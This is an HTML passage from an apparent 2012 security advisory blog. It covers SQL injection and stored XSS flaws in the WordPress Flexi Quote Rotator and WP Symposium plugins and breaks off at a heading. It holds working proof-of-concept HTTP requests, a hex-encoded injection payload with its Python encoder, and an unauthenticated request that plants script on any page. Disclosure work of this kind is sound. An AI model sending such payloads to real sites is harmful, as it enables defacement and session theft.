		<div id="crayon-53c9878a67f7c841416046" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /wordpress/wp-admin/tools.php?page=flexi-quote-rotator.php&amp;action=edit&amp;;id=3533 UNION SELECT 0x3122202f3e203c7363726970743e616c65727428646f63756d656e742e636f6f6b6965293c2f7363726970743e3c696e70757420747970653d2268696464656e22206e616d653d226964222076616c75653d2231, 2, 3 HTTP/1.1
Host: 192.168.80.130
Cookie: wordpress_f3e14e7fde6969eb515c450fed50d259=admin%7C1342212499%7C2b307f49c397cbf2b578cc5df0902004; wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259=admin%7C1342212499%7C8aec90b501bbc30db946f8f6bef9b9d8;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a67f7c841416046-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a67f7c841416046-2">2</div><div class="crayon-num" data-line="crayon-53c9878a67f7c841416046-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a67f7c841416046-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">admin</span><span class="crayon-o">/</span><span class="crayon-v">tools</span><span class="crayon-sy">.</span><span class="crayon-i">php</span><span class="crayon-sy">?</span><span class="crayon-v">page</span><span class="crayon-o">=</span><span class="crayon-i">flexi</span><span class="crayon-o">-</span><span class="crayon-i">quote</span><span class="crayon-o">-</span><span class="crayon-v">rotator</span><span class="crayon-sy">.</span><span class="crayon-i">php</span><span class="crayon-o">&amp;</span><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">edit</span><span class="crayon-o">&amp;</span><span class="crayon-sy">;</span><span class="crayon-v">id</span><span class="crayon-o">=</span><span class="crayon-cn">3533</span><span class="crayon-h"> </span><span class="crayon-e">UNION </span><span class="crayon-i">SELECT</span><span class="crayon-h"> </span><span class="crayon-cn">0x3122202f3e203c7363726970743e616c65727428646f63756d656e742e636f6f6b6965293c2f7363726970743e3c696e70757420747970653d2268696464656e22206e616d653d226964222076616c75653d2231</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">3</span><span class="crayon-h"> </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a67f7c841416046-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c9878a67f7c841416046-3"><span class="crayon-i">Cookie</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">wordpress_f3e14e7fde6969eb515c450fed50d259</span><span class="crayon-o">=</span><span class="crayon-i">admin</span><span class="crayon-o">%</span><span class="crayon-cn">7C1342212499</span><span class="crayon-o">%</span><span class="crayon-cn">7C2b307f49c397cbf2b578cc5df0902004</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259</span><span class="crayon-o">=</span><span class="crayon-i">admin</span><span class="crayon-o">%</span><span class="crayon-cn">7C1342212499</span><span class="crayon-o">%</span><span class="crayon-cn">7C8aec90b501bbc30db946f8f6bef9b9d8</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0029 seconds] -->
<p>The hex value that we use in order to bypass the magic quotes which WordPress enforces was generated this way:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a67f85360129150" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
def ToHexString(input):
	hexString = "0x"
	for s in input:
		hexString += hex(ord(s))[2:]
	return hexString

print ToHexString("1\" /&gt; &lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;input type=\"hidden\" name=\"id2\" value=\"1")</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a67f85360129150-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a67f85360129150-2">2</div><div class="crayon-num" data-line="crayon-53c9878a67f85360129150-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a67f85360129150-4">4</div><div class="crayon-num" data-line="crayon-53c9878a67f85360129150-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a67f85360129150-6">6</div><div class="crayon-num" data-line="crayon-53c9878a67f85360129150-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a67f85360129150-1"><span class="crayon-e">def </span><span class="crayon-e">ToHexString</span><span class="crayon-sy">(</span><span class="crayon-i">input</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a67f85360129150-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">hexString</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"0x"</span></div><div class="crayon-line" id="crayon-53c9878a67f85360129150-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">s</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-i">input</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a67f85360129150-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">hexString</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">hex</span><span class="crayon-sy">(</span><span class="crayon-e">ord</span><span class="crayon-sy">(</span><span class="crayon-i">s</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">2</span><span class="crayon-o">:</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-53c9878a67f85360129150-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">hexString</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a67f85360129150-6">&nbsp;</div><div class="crayon-line" id="crayon-53c9878a67f85360129150-7"><span class="crayon-e">print </span><span class="crayon-e">ToHexString</span><span class="crayon-sy">(</span><span class="crayon-s">"1\" /&gt; <span class="crayon-ta">&lt;script&gt;</span><span class="crayon-r">alert</span><span class="crayon-sy">(</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-i">cookie</span><span class="crayon-sy">)</span><span class="crayon-ta">&lt;/script&gt;</span>&lt;input type=\"hidden\" name=\"id2\" value=\"1"</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0051 seconds] -->
<p></p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="http://ceriksen.com/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="http://ceriksen.com/tag/flexi-quote-rotator/" rel="tag">Flexi Quote Rotator</a>, <a href="http://ceriksen.com/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="http://ceriksen.com/2012/07/25/wordpress-flexi-quote-rotator-plugin-multiple-vulnerabilities/#comments" title="Comment on WordPress Flexi Quote Rotator plugin multiple vulnerabilities">1 Comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-50 -->

				
					
<article id="post-26" class="post-26 post type-post status-publish format-standard hentry category-advisories tag-symposium tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="http://ceriksen.com/2012/07/25/wordpress-symposium-plugin-multiple-sql-injection-vulnerabilities/" title="4:20 pm" rel="bookmark" class="entry-date"><time datetime="2012-07-25T16:20:39+00:00" pubdate>July 25, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="http://ceriksen.com/2012/07/25/wordpress-symposium-plugin-multiple-sql-injection-vulnerabilities/" title="Permalink to WordPress Symposium plugin multiple stored XSS vulnerabilities" rel="bookmark">WordPress Symposium plugin multiple stored XSS vulnerabilities</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong><br />
<a href="http://secunia.com/advisories/49791/">Secunia Advisory SA 49791</a></p>
<p><strong>Analysis of add_to_page vulnerability</strong><br />
The first vulnerability in <a href="http://plugins.trac.wordpress.org/browser/wp-symposium/tags/12.06.30/ajax/symposium_ajax_functions.php?rev=565782">/ajax/symposium_ajax_functions.php</a> in the &#8220;add_to_page&#8221; action relies on a lack of validation of the $current_user variable that is declared through global. The function allows you to append text to any arbitrary page, which can be abused for a XSS attack.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a68ba8203320313" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
if ($action == "add_to_page") {

        global $wpdb, $current_user;

        $r = 'OK';

        $shortcode = $_POST['shortcode'];
        $id = $_POST['id'];

        // get existing value
        $sql = "SELECT post_content FROM ".$wpdb-&gt;prefix."posts WHERE ID = %d";
        $tmp = $wpdb-&gt;get_var($wpdb-&gt;prepare($sql, $id));       
        $tmp .= '['.$shortcode.']';

        // update
        $sql = "UPDATE ".$wpdb-&gt;prefix."posts SET post_content = %s WHERE ID = %d";
        $wpdb-&gt;query($wpdb-&gt;prepare($sql, $tmp, $id));             
       
        echo $r;
        exit;   
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a68ba8203320313-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68ba8203320313-2">2</div><div class="crayon-num" data-line="crayon-53c9878a68ba8203320313-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68ba8203320313-4">4</div><div class="crayon-num" data-line="crayon-53c9878a68ba8203320313-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68ba8203320313-6">6</div><div class="crayon-num" data-line="crayon-53c9878a68ba8203320313-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68ba8203320313-8">8</div><div class="crayon-num" data-line="crayon-53c9878a68ba8203320313-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68ba8203320313-10">10</div><div class="crayon-num" data-line="crayon-53c9878a68ba8203320313-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68ba8203320313-12">12</div><div class="crayon-num" data-line="crayon-53c9878a68ba8203320313-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68ba8203320313-14">14</div><div class="crayon-num" data-line="crayon-53c9878a68ba8203320313-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68ba8203320313-16">16</div><div class="crayon-num" data-line="crayon-53c9878a68ba8203320313-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68ba8203320313-18">18</div><div class="crayon-num" data-line="crayon-53c9878a68ba8203320313-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68ba8203320313-20">20</div><div class="crayon-num" data-line="crayon-53c9878a68ba8203320313-21">21</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a68ba8203320313-1"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">action</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"add_to_page"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68ba8203320313-2">&nbsp;</div><div class="crayon-line" id="crayon-53c9878a68ba8203320313-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">current_user</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68ba8203320313-4">&nbsp;</div><div class="crayon-line" id="crayon-53c9878a68ba8203320313-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'OK'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68ba8203320313-6">&nbsp;</div><div class="crayon-line" id="crayon-53c9878a68ba8203320313-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">shortcode</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'shortcode'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68ba8203320313-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'id'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a68ba8203320313-9">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68ba8203320313-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// get existing value</span></div><div class="crayon-line" id="crayon-53c9878a68ba8203320313-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT post_content FROM "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"posts WHERE ID = %d"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68ba8203320313-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">tmp</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">id</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></div><div class="crayon-line" id="crayon-53c9878a68ba8203320313-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">tmp</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'['</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">shortcode</span><span class="crayon-sy">.</span><span class="crayon-s">']'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68ba8203320313-14">&nbsp;</div><div class="crayon-line" id="crayon-53c9878a68ba8203320313-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// update</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68ba8203320313-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"UPDATE "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"posts SET post_content = %s WHERE ID = %d"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878a68ba8203320313-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">tmp</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">id</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68ba8203320313-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></div><div class="crayon-line" id="crayon-53c9878a68ba8203320313-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">r</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68ba8203320313-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">exit</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp; </span></div><div class="crayon-line" id="crayon-53c9878a68ba8203320313-21"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0060 seconds] -->
<p>Because there is no validation of the user calling this action before this, as the $current_user variable is only just globally included at line 156, and no valididation is made in respect to it, we have a vulnerability since globally including a variable does not guarantee that it exists. Therefor you can call this while not being authenticated, and add a XSS payload to any page:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878a68bb7505185896" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_ajax_functions.php HTTP/1.1
Host: 192.168.80.130
Content-Type: application/x-www-form-urlencoded
Content-Length: 74

action=add_to_page&amp;id=1&amp;shortcode=&lt;script&gt;alert(document.cookie);&lt;/script&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878a68bb7505185896-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bb7505185896-2">2</div><div class="crayon-num" data-line="crayon-53c9878a68bb7505185896-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bb7505185896-4">4</div><div class="crayon-num" data-line="crayon-53c9878a68bb7505185896-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878a68bb7505185896-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878a68bb7505185896-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_ajax_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bb7505185896-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c9878a68bb7505185896-3"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bb7505185896-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">74</span></div><div class="crayon-line" id="crayon-53c9878a68bb7505185896-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878a68bb7505185896-6"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">add_to_page</span><span class="crayon-o">&amp;</span><span class="crayon-v">id</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-o">&amp;</span><span class="crayon-v">shortcode</span><span class="crayon-o">=</span><span class="crayon-ta">&lt;script&gt;</span><span class="crayon-r">alert</span><span class="crayon-sy">(</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-i">cookie</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-ta">&lt;/script&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0028 seconds] -->
<p>If you now load the frontpage(Which is by default page 1), you will now observe that it alerts out your cookie.</p>
<p><strong>Analysis of add_new_page vulnerability</strong><br />
